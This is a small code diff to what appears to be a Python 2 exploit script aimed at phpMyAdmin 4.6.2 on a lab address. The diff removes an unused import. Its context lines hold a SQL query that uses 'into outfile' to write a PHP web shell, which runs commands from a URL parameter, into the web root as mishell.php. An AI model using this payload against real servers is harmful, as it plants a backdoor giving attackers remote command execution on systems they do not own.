@@ -2,7 +2,6 @@
 
 import urllib2, urllib, cookielib
 import string
-from datetime import datetime
 
 base = u'http://192.168.56.101/pma/phpMyAdmin-4.6.2-all-languages/'
 query = 'select "<?php system($_GET[\'x\']);" into outfile "/var/www/html/testlink/mishell.php"'
